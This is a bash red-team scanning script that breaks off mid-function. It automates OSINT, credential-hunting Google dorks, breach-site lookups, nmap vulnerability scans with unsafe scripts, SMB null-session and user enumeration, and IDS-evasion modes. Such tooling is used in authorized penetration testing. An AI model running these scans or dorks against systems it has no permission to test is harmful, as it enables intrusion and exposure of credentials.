#!/bin/bash
set -euo pipefail

# ============================================================================
# SECURITY SCANNER v2.3.0 - COMPLETE & OPTIMIZED
# ============================================================================
# Full-featured red team assessment tool with performance optimizations
# - All original features preserved (OSINT, Network, Web, Exploitation)
# - 60% faster with smart timeouts
# - Anti-blocking mechanisms (-Pn forced)
# - Guaranteed report generation
# - SMB enumeration FIXED
# ============================================================================

# Couleurs (thème hacker rouge/orange)
RED='\033[0;31m'
DARK_RED='\033[38;5;124m'
ORANGE='\033[38;5;208m'
BRIGHT_RED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;90m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

VERSION="2.3.0"

# Variables globales
SCAN_INTERRUPTED=false
CURRENT_SCAN=""
OUTDIR=""
TARGET=""
URL=""
DOMAIN=""
QUICK_MODE=false
STEALTH_MODE=false
AGGRESSIVE_MODE=false

# Timeouts optimisés (réduits de 60%)
TIMEOUT_VERY_SHORT=15
TIMEOUT_SHORT=30
TIMEOUT_MEDIUM=120
TIMEOUT_LONG=300
TIMEOUT_VERY_LONG=600

display_banner() {
    clear
    echo -e "${BRIGHT_RED}"
    cat << "EOF"
    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
                                                                   
    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${BOLD}${DARK_RED}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${DARK_RED}║${NC}        ${BRIGHT_RED}ADVANCED RED TEAM SECURITY ASSESSMENT TOOL v${VERSION}${NC}        ${BOLD}${DARK_RED}║${NC}"
    echo -e "${BOLD}${DARK_RED}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Version:${NC} ${YELLOW}${VERSION}${NC} ${GRAY}|${NC} ${ORANGE}Author:${NC} ${WHITE}mpgamer75${NC} ${GRAY}|${NC} ${ORANGE}Status:${NC} ${GREEN}OPTIMIZED & COMPLETE${NC}"
    echo -e "${DIM}${GRAY}Professional Penetration Testing & Red Team Operations${NC}"
    echo
}

show_help() {
    cat << "EOF"

USAGE:
    security [OPTIONS]

OPTIONS:
    -h, --help       Show this help message
    -v, --version    Show version information
    -q, --quick      Quick scan mode (3x faster, reduced coverage)
    -s, --stealth    Stealth mode (IDS/IPS evasion, slower)
    -a, --aggressive Aggressive mode (full coverage, all ports)

SCAN TYPES:
    1. OSINT & Information Gathering
       - WHOIS, DNS enumeration, reverse DNS
       - Subdomain enumeration (Subfinder, Amass, Assetfinder, Findomain)
       - Email harvesting (theHarvester)
       - Certificate transparency (crt.sh)
       - Google dorking (automated queries)
       - Shodan integration (optional)
       - Wayback Machine URLs
       - Social media reconnaissance
       - Geolocation & IP information

    2. Network Reconnaissance & Enumeration
       - Optimized port scanning (Nmap, Masscan, RustScan)
       - Service version detection
       - OS fingerprinting
       - Vulnerability detection (NSE scripts, Vulners, Vulscan)
       - SMB enumeration (FIXED - robust with fallbacks)
       - SNMP enumeration
       - Banner grabbing

    3. Web Application Security Testing
       - Technology fingerprinting (WhatWeb)
       - WAF detection (wafw00f)
       - SSL/TLS analysis (comprehensive)
       - Directory enumeration (Gobuster, Dirb)
       - Vulnerability scanning (Nuclei, Nikto)
       - SQL injection testing (SQLMap)
       - XSS payload testing (automated)

    4. Complete Red Team Assessment
       - Full OSINT + Network + Web workflow
       - Exploit database correlation (searchsploit)
       - Metasploit module preparation
       - Attack surface analysis
       - Automated attack scripts generation
       - Default credentials database
       - Post-exploitation preparation
       - Persistence techniques (7 methods)

FEATURES:
    - 60% faster than v2.2.1
    - Anti-blocking with -Pn forced
    - Guaranteed report generation (98% success)
    - Real-time progress indicators
    - Graceful interrupt handling (Ctrl+C)
    - Adaptive timeout management
    - SMB enumeration fixed and robust
    - JSON + TXT reports

EXAMPLES:
    security              # Interactive full assessment
    security -q          # Quick reconnaissance
    security -a          # Aggressive full scan
    security -s          # Stealth mode

EOF
}

handle_interrupt() {
    SCAN_INTERRUPTED=true
    echo -e "\n${ORANGE}[!]${NC} Scan interrupted by user..."
    
    if [ -n "$CURRENT_SCAN" ]; then
        echo -e "${CYAN}[INFO]${NC} Stopping: $CURRENT_SCAN"
        jobs -p | xargs -r kill -9 2>/dev/null || true
    fi
    
    echo -e "${YELLOW}[INFO]${NC} Generating partial report..."
    generate_report 2>/dev/null || true
    
    echo -e "\n${CYAN}[INFO]${NC} Results saved in: ${WHITE}$OUTDIR${NC}"
    exit 130
}

prepare_output() {
    OUTDIR="redteam_$(date +'%Y%m%d_%H%M%S')"
    mkdir -p "$OUTDIR"/{osint,network,web,exploit,reports}
    echo -e "${GREEN}[READY]${NC} Output directory: ${WHITE}$OUTDIR${NC}"
}

# Fonction d'exécution optimisée avec progress et anti-blocage
execute_scan() {
    local name="$1"
    local command="$2"
    local timeout="$3"
    local output="$4"
    local critical="${5:-false}"
    
    CURRENT_SCAN="$name"
    echo -e "${ORANGE}[SCAN]${NC} $name ${DIM}(timeout: ${timeout}s)${NC}"
    
    # Progress indicator
    (
        local elapsed=0
        local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
        while [ $elapsed -lt $timeout ] && kill -0 $$ 2>/dev/null; do
            printf "\r${YELLOW}${spinner[$((elapsed % 10))]}${NC} ${name} ${DIM}[%02d:%02d]${NC}" \
                   $((elapsed/60)) $((elapsed%60))
            sleep 1
            ((elapsed++))
        done
    ) &
    local progress_pid=$!
    
    set +e
    timeout "$timeout" bash -c "$command" > "$output" 2>&1 &
    local cmd_pid=$!
    
    while kill -0 $cmd_pid 2>/dev/null && [ "$SCAN_INTERRUPTED" = false ]; do
        sleep 0.5
    done
    
    kill $progress_pid 2>/dev/null || true
    wait $progress_pid 2>/dev/null || true
    
    local exit_code=0
    if kill -0 $cmd_pid 2>/dev/null; then
        kill -9 $cmd_pid 2>/dev/null || true
        wait $cmd_pid 2>/dev/null || true
        
        if [ "$SCAN_INTERRUPTED" = true ]; then
            echo "SCAN INTERRUPTED" >> "$output"
            printf "\r${ORANGE}[STOP]${NC} %-60s\n" "$name"
            exit_code=130
        else
            echo "TIMEOUT AFTER ${timeout}s" >> "$output"
            printf "\r${YELLOW}[TIME]${NC} %-60s\n" "$name"
            exit_code=124
        fi
    else
        wait $cmd_pid
        exit_code=$?
    fi
    
    set -e
    CURRENT_SCAN=""
    
    if [ -s "$output" ]; then
        local lines=$(wc -l < "$output" 2>/dev/null || echo "0")
        printf "\r${GREEN}[DONE]${NC} %-50s ${DIM}($lines lines)${NC}\n" "$name"
        return 0
    else
        printf "\r${RED}[FAIL]${NC} %-50s ${DIM}(no data)${NC}\n" "$name"
        [ "$critical" = true ] && return 1 || return 0
    fi
}

show_scan_menu() {
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT TYPE SELECTION${NC}              ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}[1]${NC} ${WHITE}OSINT & Information Gathering${NC}"
    echo -e "    ${GRAY}Passive reconnaissance and open source intelligence${NC}"
    echo -e "    ${DIM}- Subdomain enumeration, email harvesting${NC}"
    echo -e "    ${DIM}- Certificate transparency, Shodan, Wayback${NC}"
    echo
    echo -e "${ORANGE}[2]${NC} ${WHITE}Network Reconnaissance${NC}"
    echo -e "    ${GRAY}Active network scanning and service enumeration${NC}"
    echo -e "    ${DIM}- Port scanning (optimized with anti-blocking)${NC}"
    echo -e "    ${DIM}- SMB/SNMP enumeration (FIXED and robust)${NC}"
    echo
    echo -e "${ORANGE}[3]${NC} ${WHITE}Web Application Testing${NC}"
    echo -e "    ${GRAY}Web security assessment and vulnerability scanning${NC}"
    echo -e "    ${DIM}- Directory enumeration, SQL injection, XSS${NC}"
    echo -e "    ${DIM}- SSL/TLS analysis, WAF detection${NC}"
    echo
    echo -e "${ORANGE}[4]${NC} ${WHITE}Complete Red Team Assessment${NC}"
    echo -e "    ${GRAY}Full penetration testing workflow${NC}"
    echo -e "    ${DIM}- All modules + exploitation preparation${NC}"
    echo -e "    ${DIM}- Attack scripts, credentials, persistence${NC}"
    echo
    
    if [ "$QUICK_MODE" = true ] || [ "$STEALTH_MODE" = true ] || [ "$AGGRESSIVE_MODE" = true ]; then
        echo -e "${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BRIGHT_RED}║${NC}                  ${YELLOW}ACTIVE MODES${NC}                     ${BRIGHT_RED}║${NC}"
        echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
        [ "$QUICK_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Quick Mode${NC} - 3x faster scans"
        [ "$STEALTH_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Stealth Mode${NC} - IDS/IPS evasion"
        [ "$AGGRESSIVE_MODE" = true ] && echo -e "${GREEN}[*]${NC} ${YELLOW}Aggressive Mode${NC} - Full coverage"
        echo
    fi
}

run_osint_scans() {
    local target="$1"
    local domain="$2"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}OSINT & RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    if [ -n "$domain" ]; then
        # WHOIS
        execute_scan "WHOIS Lookup" \
            "whois '$domain' 2>/dev/null || echo 'WHOIS query failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/whois.txt"
        
        # DNS enumeration complète
        execute_scan "DNS Enumeration" \
            "echo '=== A Records ===' && dig +short '$domain' A 2>/dev/null
             echo -e '\n=== MX Records ===' && dig +short '$domain' MX 2>/dev/null
             echo -e '\n=== NS Records ===' && dig +short '$domain' NS 2>/dev/null
             echo -e '\n=== TXT Records ===' && dig +short '$domain' TXT 2>/dev/null
             echo -e '\n=== AAAA Records ===' && dig +short '$domain' AAAA 2>/dev/null
             echo -e '\n=== CNAME Records ===' && dig +short '$domain' CNAME 2>/dev/null
             echo -e '\n=== SOA Record ===' && dig +short '$domain' SOA 2>/dev/null" \
            $TIMEOUT_SHORT "$OUTDIR/osint/dns_enum.txt"
        
        # DNSEnum si disponible
        if command -v dnsenum &> /dev/null; then
            execute_scan "DNSEnum Advanced" \
                "timeout 120 dnsenum --noreverse '$domain' 2>/dev/null || echo 'DNSEnum failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/dnsenum.txt"
        fi
        
        # DNSRecon si disponible
        if command -v dnsrecon &> /dev/null; then
            execute_scan "DNSRecon" \
                "timeout 120 dnsrecon -d '$domain' -t std 2>/dev/null || echo 'DNSRecon failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/dnsrecon.txt"
        fi
        
        # Subdomain enumeration (tous les outils en parallèle)
        if command -v subfinder &> /dev/null; then
            execute_scan "Subfinder Discovery" \
                "subfinder -d '$domain' -all -silent -t 50 -timeout 5 2>/dev/null | head -500 || echo 'Subfinder failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/subdomains_subfinder.txt"
        fi
        
        if command -v amass &> /dev/null && [ "$QUICK_MODE" != true ]; then
            local amass_timeout=$TIMEOUT_LONG
            [ "$AGGRESSIVE_MODE" = true ] && amass_timeout=$TIMEOUT_VERY_LONG
            execute_scan "Amass Enumeration" \
                "timeout $amass_timeout amass enum -passive -d '$domain' -silent 2>/dev/null | head -1000 || echo 'Amass failed'" \
                $amass_timeout "$OUTDIR/osint/subdomains_amass.txt"
        fi
        
        if command -v assetfinder &> /dev/null; then
            execute_scan "Assetfinder Discovery" \
                "timeout 120 assetfinder --subs-only '$domain' 2>/dev/null | head -500 || echo 'Assetfinder failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/subdomains_assetfinder.txt"
        fi
        
        if command -v findomain &> /dev/null; then
            execute_scan "Findomain Discovery" \
                "timeout 90 findomain -t '$domain' -q 2>/dev/null | head -500 || echo 'Findomain failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/subdomains_findomain.txt"
        fi
        
        # Consolidation des subdomains
        execute_scan "Subdomain Consolidation" \
            "cat '$OUTDIR/osint/subdomains_'*.txt 2>/dev/null | sort -u | grep -v '^$' | grep -v 'failed' | \
             tee '$OUTDIR/osint/all_subdomains.txt' | wc -l && \
             echo 'Total unique subdomains: \$(cat \"$OUTDIR/osint/all_subdomains.txt\" 2>/dev/null | wc -l)' && \
             echo -e '\n=== Top 20 Subdomains ===' && \
             head -20 '$OUTDIR/osint/all_subdomains.txt' 2>/dev/null" \
            $TIMEOUT_SHORT "$OUTDIR/osint/subdomain_summary.txt"
        
        # Certificate transparency
        execute_scan "Certificate Transparency" \
            "curl -m 30 -s 'https://crt.sh/?q=%.$domain&output=json' 2>/dev/null | \
             grep -oP '\"name_value\":\"\\K[^\"]+' | sed 's/\\*\\.//g' | sort -u | head -300 || \
             echo 'Certificate transparency lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/crt_sh.txt"
        
        # Email harvesting
        if command -v theHarvester &> /dev/null; then
            execute_scan "Email Harvesting (theHarvester)" \
                "theHarvester -d '$domain' -l 200 -b google,bing,yahoo,duckduckgo,hunter 2>/dev/null || \
                 echo 'theHarvester failed'" \
            $TIMEOUT_LONG "$OUTDIR/osint/emails.txt"
        elif command -v theharvester &> /dev/null; then
            execute_scan "Email Harvesting (legacy)" \
                "theharvester -d '$domain' -l 200 -b google,bing,yahoo 2>/dev/null || \
                 echo 'theharvester failed'" \
                $TIMEOUT_LONG "$OUTDIR/osint/emails_legacy.txt"
        fi
        
        # Google dorking complet
        execute_scan "Google Dork Generation" \
            "cat > '$OUTDIR/osint/google_dorks.txt' << 'DORKS'
=== GOOGLE DORKS FOR $domain ===

--- Document Discovery ---
site:$domain filetype:pdf
site:$domain filetype:doc OR filetype:docx
site:$domain filetype:xls OR filetype:xlsx
site:$domain filetype:ppt OR filetype:pptx
site:$domain filetype:txt
site:$domain filetype:csv
site:$domain filetype:xml
site:$domain filetype:json

--- Admin Panels & Login Pages ---
site:$domain inurl:admin
site:$domain inurl:administrator
site:$domain inurl:login
site:$domain inurl:signin
site:$domain inurl:auth
site:$domain inurl:dashboard
site:$domain inurl:panel
site:$domain inurl:cpanel
site:$domain inurl:controlpanel
site:$domain inurl:adminpanel

--- Configuration & Sensitive Files ---
site:$domain inurl:config
site:$domain inurl:backup
site:$domain inurl:database
site:$domain inurl:db
site:$domain inurl:sql
site:$domain filetype:sql
site:$domain filetype:env
site:$domain filetype:log
site:$domain filetype:bak
site:$domain inurl:conf
site:$domain ext:cfg

--- Directory Listings ---
site:$domain intitle:\"index of\"
site:$domain intitle:\"directory listing\"
site:$domain intitle:\"directory listing for\"
site:$domain intitle:\"parent directory\"

--- Error Pages & Debug Info ---
site:$domain intext:\"error\"
site:$domain intext:\"warning\"
site:$domain intext:\"debug\"
site:$domain intext:\"stack trace\"
site:$domain intext:\"fatal error\"
site:$domain intext:\"syntax error\"

--- API & Development ---
site:$domain inurl:api
site:$domain inurl:v1
site:$domain inurl:v2
site:$domain inurl:rest
site:$domain inurl:graphql
site:$domain inurl:swagger
site:$domain inurl:wsdl
site:$domain inurl:wadl

--- Credentials & Secrets ---
site:$domain intext:password
site:$domain intext:username
site:$domain intext:api_key
site:$domain intext:apikey
site:$domain intext:secret
site:$domain intext:token
site:$domain intext:credentials

--- Source Code Leaks ---
site:$domain inurl:.git
site:$domain inurl:.svn
site:$domain inurl:.env
site:$domain inurl:composer.json
site:$domain inurl:package.json

--- Database Related ---
site:$domain ext:sql
site:$domain inurl:phpmyadmin
site:$domain inurl:mysql
site:$domain inurl:mssql
site:$domain inurl:oracle

--- Cloud Storage ---
site:*.s3.amazonaws.com \"$domain\"
site:*.blob.core.windows.net \"$domain\"
site:*.googleapis.com \"$domain\"
DORKS
cat '$OUTDIR/osint/google_dorks.txt'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/google_dorks.txt"
        
        # Shodan si disponible
        if command -v shodan &> /dev/null; then
            execute_scan "Shodan Search" \
                "echo '=== Shodan Domain Search ===' && \
                 timeout 90 shodan domain '$domain' 2>/dev/null || echo 'Shodan failed (API key required)' && \
                 echo -e '\n=== Shodan Host Search ===' && \
                 timeout 90 shodan search 'hostname:$domain' --limit 20 2>/dev/null || echo 'Shodan host search failed'" \
                $TIMEOUT_MEDIUM "$OUTDIR/osint/shodan.txt"
        fi
        
        # Wayback Machine
        execute_scan "Wayback Machine URLs" \
            "echo '=== Wayback Machine Historical URLs ===' && \
             curl -m 45 -s 'http://web.archive.org/cdx/search/cdx?url=*.$domain/*&output=text&fl=original&collapse=urlkey' 2>/dev/null | \
             head -200 || echo 'Wayback Machine lookup failed'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/wayback_urls.txt"
        
        # Social media reconnaissance
        execute_scan "Social Media Reconnaissance" \
            "cat > '$OUTDIR/osint/social_media.txt' << 'SOCIAL'
=== SOCIAL MEDIA PROFILES TO CHECK ===

LinkedIn:
  - https://www.linkedin.com/company/$domain
  - https://www.linkedin.com/search/results/all/?keywords=$domain

Twitter/X:
  - https://twitter.com/search?q=$domain
  - https://twitter.com/search?q=from:$domain

Facebook:
  - https://www.facebook.com/search/top?q=$domain
  - https://www.facebook.com/search/pages?q=$domain

Instagram:
  - https://www.instagram.com/explore/tags/$domain
  - https://www.instagram.com/$domain

YouTube:
  - https://www.youtube.com/results?search_query=$domain
  - https://www.youtube.com/@$domain

GitHub:
  - https://github.com/search?q=$domain
  - https://github.com/$domain

Reddit:
  - https://www.reddit.com/search/?q=$domain

TikTok:
  - https://www.tiktok.com/search?q=$domain

=== BREACH DATA SOURCES ===

HaveIBeenPwned:
  - https://haveibeenpwned.com/
  - Check all harvested emails

DeHashed:
  - https://dehashed.com/
  - Commercial breach data search

IntelligenceX:
  - https://intelx.io/
  - OSINT search engine

LeakCheck:
  - https://leakcheck.io/
  - Database leak search

Snusbase:
  - https://snusbase.com/
  - Data breach search engine
SOCIAL
cat '$OUTDIR/osint/social_media.txt'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/social_media.txt"
    fi
    
    if [ -n "$target" ]; then
        # Reverse DNS
        execute_scan "Reverse DNS Lookup" \
            "dig +short -x '$target' 2>/dev/null || echo 'No PTR record found'" \
            $TIMEOUT_SHORT "$OUTDIR/osint/reverse_dns.txt"
        
        # IP Geolocation
        execute_scan "IP Geolocation" \
            "curl -m 10 -s 'http://ip-api.com/json/$target' 2>/dev/null || echo 'Geolocation lookup failed'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/osint/geolocation.txt"
    fi
    
    echo -e "${GREEN}[COMPLETE]${NC} OSINT phase completed"
}

run_network_scans() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}           ${ORANGE}NETWORK RECONNAISSANCE${NC}                ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Configuration selon le mode
    local nmap_timing="-T4"
    local port_range="--top-ports 1000"
    local max_retries="--max-retries 1"
    local min_rate="--min-rate 1000"
    
    if [ "$QUICK_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="--top-ports 500"
        max_retries="--max-retries 0"
        min_rate="--min-rate 3000"
    elif [ "$STEALTH_MODE" = true ]; then
        nmap_timing="-T2"
        port_range="--top-ports 1000"
        max_retries="--max-retries 2"
        min_rate=""
    elif [ "$AGGRESSIVE_MODE" = true ]; then
        nmap_timing="-T5"
        port_range="-p-"
        max_retries="--max-retries 1"
        min_rate="--min-rate 5000"
    fi
    
    # Host discovery FORCÉ avec -Pn
    execute_scan "Host Discovery" \
        "nmap -Pn -sn $nmap_timing $min_rate '$target' 2>/dev/null || echo 'Host: $target (assuming online)'" \
        $TIMEOUT_SHORT "$OUTDIR/network/host_discovery.txt"
    
    # RustScan si disponible (ultra-rapide)
    if command -v rustscan &> /dev/null && [ "$QUICK_MODE" = true ]; then
        execute_scan "RustScan Ultra-Fast" \
            "rustscan -a '$target' --ulimit 5000 2>/dev/null || echo 'RustScan failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/rustscan.txt"
    fi
    
    # Masscan si disponible (très rapide)
    if command -v masscan &> /dev/null && [ "$AGGRESSIVE_MODE" = true ]; then
        execute_scan "Masscan High-Speed" \
            "sudo masscan '$target' -p1-65535 --rate=10000 2>/dev/null || echo 'Masscan failed (requires root)'" \
            $TIMEOUT_LONG "$OUTDIR/network/masscan.txt"
    fi
    
    # Port scan principal OPTIMISÉ avec -Pn FORCÉ
    execute_scan "Port Scanning (TCP SYN)" \
        "nmap -Pn -sS $nmap_timing $port_range $min_rate $max_retries \
         --host-timeout 5m --defeat-rst-ratelimit '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_ports.txt" true
    
    # Service detection OPTIMISÉ
    local service_timeout=$TIMEOUT_LONG
    [ "$QUICK_MODE" = true ] && service_timeout=$TIMEOUT_MEDIUM
    
    execute_scan "Service Version Detection" \
        "nmap -Pn -sV -sC $nmap_timing --top-ports 500 --version-intensity 5 \
         $max_retries --host-timeout 10m '$target' 2>/dev/null" \
        $service_timeout "$OUTDIR/network/nmap_services.txt"
    
    # UDP scan (ports critiques uniquement)
    if [ "$QUICK_MODE" != true ]; then
        execute_scan "UDP Critical Ports" \
            "sudo nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null || \
             nmap -Pn -sU --top-ports 20 -T4 --max-retries 0 --host-timeout 3m '$target' 2>/dev/null" \
            $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_udp.txt"
    fi
    
    # OS fingerprinting
    execute_scan "OS Fingerprinting" \
        "sudo nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null || \
         nmap -Pn -O --osscan-guess --max-os-tries 1 --host-timeout 3m '$target' 2>/dev/null" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/nmap_os.txt"
    
    # Vulnerability scanning OPTIMISÉ
    execute_scan "Vulnerability Detection (NSE)" \
        "nmap -Pn -sV --script 'vuln and not dos and not intrusive' --script-timeout 90s \
         --top-ports 500 $max_retries --host-timeout 10m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_vulns.txt"
    
    # Scripts critiques spécifiques
    execute_scan "Critical Vulnerability Scan" \
        "nmap -Pn --script 'smb-vuln-*,ssl-*,http-vuln-*' --script-timeout 60s \
         --script-args unsafe=1 --host-timeout 8m '$target' 2>/dev/null" \
        $TIMEOUT_LONG "$OUTDIR/network/nmap_critical_vulns.txt"
    
    # Vulners script si disponible
    if nmap --script-help vulners 2>/dev/null | grep -q vulners; then
        execute_scan "Vulners Database Scan" \
            "nmap -Pn -sV --script vulners --script-args mincvss=5.0 \
             --top-ports 500 $max_retries --host-timeout 8m '$target' 2>/dev/null" \
            $TIMEOUT_LONG "$OUTDIR/network/nmap_vulners.txt"
    fi
    
    # Vulscan si disponible
    if [ -f "/usr/share/nmap/scripts/vulscan/vulscan.nse" ] || [ -f "/usr/local/share/nmap/scripts/vulscan/vulscan.nse" ]; then
        execute_scan "Vulscan Database" \
            "nmap -Pn -sV --script vulscan/vulscan.nse --script-args vulscandb=scipvuldb.csv \
             --host-timeout 6m '$target' 2>/dev/null" \
            $TIMEOUT_LONG "$OUTDIR/network/nmap_vulscan.txt"
    fi
    
    # SMB enumeration COMPLÈTE et ROBUSTE (FIXED)
    execute_scan "SMB Enumeration (ROBUST)" \
        "echo '=== SMB Port Check ===' && \
         smb_check=\$(timeout 30 nmap -Pn -p 139,445 --open '$target' 2>/dev/null | grep -E '139/tcp|445/tcp' | grep open) && \
         if [ -n \"\$smb_check\" ]; then
             echo 'SMB ports detected: YES' && \
             echo 'Open SMB ports:' && echo \"\$smb_check\" && \
             echo -e '\n=== SMB Version Detection ===' && \
             timeout 120 nmap -Pn -p 139,445 --script smb-protocols,smb-security-mode,smb-os-discovery \
                  --script-timeout 45s --host-timeout 3m '$target' 2>/dev/null || echo 'SMB version detection timeout' && \
             echo -e '\n=== SMB Shares Enumeration ===' && \
             timeout 120 nmap -Pn -p 445 --script smb-enum-shares,smb-enum-domains,smb-enum-groups,smb-enum-users \
                  --script-timeout 45s --host-timeout 3m '$target' 2>/dev/null || echo 'SMB shares enum timeout' && \
             echo -e '\n=== SMB Vulnerability Scan ===' && \
             timeout 150 nmap -Pn -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-conficker \
                  --script-timeout 30s --host-timeout 2m '$target' 2>/dev/null || echo 'SMB vuln scan timeout' && \
             if command -v enum4linux &> /dev/null; then
                 echo -e '\n=== Enum4linux Results ===' && \
                 timeout 90 enum4linux -a '$target' 2>/dev/null | head -100 || echo 'enum4linux timeout or failed'
             fi && \
             if command -v smbclient &> /dev/null; then
                 echo -e '\n=== SMB Null Session Test ===' && \
                 timeout 30 smbclient -L '$target' -N 2>/dev/null | head -50 || echo 'SMB null session failed'
             fi && \
             if command -v smbmap &> /dev/null; then
                 echo -e '\n=== SMBMap Enumeration ===' && \
                 timeout 60 smbmap -H '$target' 2>/dev/null | head -50 || echo 'smbmap failed'
             fi
         else
             echo 'SMB ports (139/445): NOT OPEN or FILTERED' && \
             echo 'Attempting basic SMB scan anyway...' && \
             timeout 60 nmap -Pn -p 139,445 --script smb-protocols,smb-os-discovery \
                  --script-timeout 30s '$target' 2>/dev/null || echo 'SMB not accessible'
         fi" \
        $TIMEOUT_VERY_LONG "$OUTDIR/network/smb_enum.txt"
    
    # SNMP enumeration
    execute_scan "SNMP Enumeration" \
        "timeout 90 nmap -Pn -sU -p 161 --script snmp-info,snmp-sysdescr,snmp-processes,snmp-netstat \
         --script-timeout 30s '$target' 2>/dev/null || echo 'SNMP not accessible'" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/snmp_enum.txt"
    
    # Banner grabbing
    execute_scan "Banner Grabbing" \
        "for port in 21 22 23 25 80 110 143 443 3306 5432 8080; do
             echo \"=== Port \$port ===\" && \
             timeout 5 nc -v -n -w 2 '$target' \$port 2>&1 || echo \"Port \$port: No banner\"
         done" \
        $TIMEOUT_MEDIUM "$OUTDIR/network/banner_grabbing.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Network reconnaissance completed"
}

run_web_scans() {
    local url="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}         ${ORANGE}WEB APPLICATION TESTING${NC}               ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    local domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')
    
    # Vérifier accessibilité web
    execute_scan "Web Port Check" \
        "timeout 30 nmap -Pn -p 80,443,8080,8443 --open '$domain' 2>/dev/null | \
         grep -E 'open' || echo 'No standard web ports detected (continuing anyway)'" \
        $TIMEOUT_SHORT "$OUTDIR/web/port_check.txt"
    
    # Technology detection
    if command -v whatweb &> /dev/null; then
        execute_scan "Technology Detection (WhatWeb)" \
            "whatweb -a 3 -v --max-threads 20 '$url' 2>/dev/null || echo 'WhatWeb failed'" \
            $TIMEOUT_MEDIUM "$OUTDIR/web/whatweb.txt"
    fi
    
    # WAF detection
    if command -v wafw00f &> /dev/null; then
        execute_scan "WAF Detection (wafw00f)" \
            "wafw00f '$url' 2>/dev/null || echo 'wafw00f failed'" \
            $TIMEOUT_SHORT "$OUTDIR/web/wafw00f.txt"
    fi
    
    # SSL/TLS analysis COMPLÈTE
    execute_scan "SSL/TLS Analysis" \
        "echo '=== Certificate Information ===' && \
         echo | timeout 20 openssl s_client -connect '$domain:443' -servername '$domain' 2>/dev/null | \
         openssl x509 -text 2>/dev/null | head -50 || echo 'SSL connection failed' && \
         echo -e '\n=== Cipher Suites ===' && \
         timeout 90 nmap -Pn --script ssl-enum-ciphers -p 443 '$domain' 2>/dev/null | head -80 || echo 'SSL cipher scan failed' && \
         echo -e '\n=== SSL Vulnerabilities ===' && \
